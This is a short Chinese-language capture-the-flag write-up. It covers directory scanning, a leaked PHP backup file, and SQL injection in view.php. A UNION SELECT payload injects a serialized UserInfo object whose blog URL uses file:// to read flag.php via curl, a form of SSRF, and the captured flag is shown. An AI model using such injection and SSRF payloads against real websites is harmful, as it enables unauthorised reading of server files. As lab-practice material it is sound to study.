dirsearch.py扫描网站目录，得到user.php.bak，以及存在flag.php文件。

```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

看到function get($url)，可能存在SSRF漏洞，构造blog为flag.php文件地址。

在`http://111.200.241.244:57021/view.php?no=1`页面存在sql注入漏洞，可以爆破出no、username、passwd、data四列，其中data为序列化数据。

```
11233c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:7:"bai.com";}
```

构造payload：

```
no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'--+
```

查看源码，得到flag：flag{c1e552fdf77049fabf65168f22f7aeab}

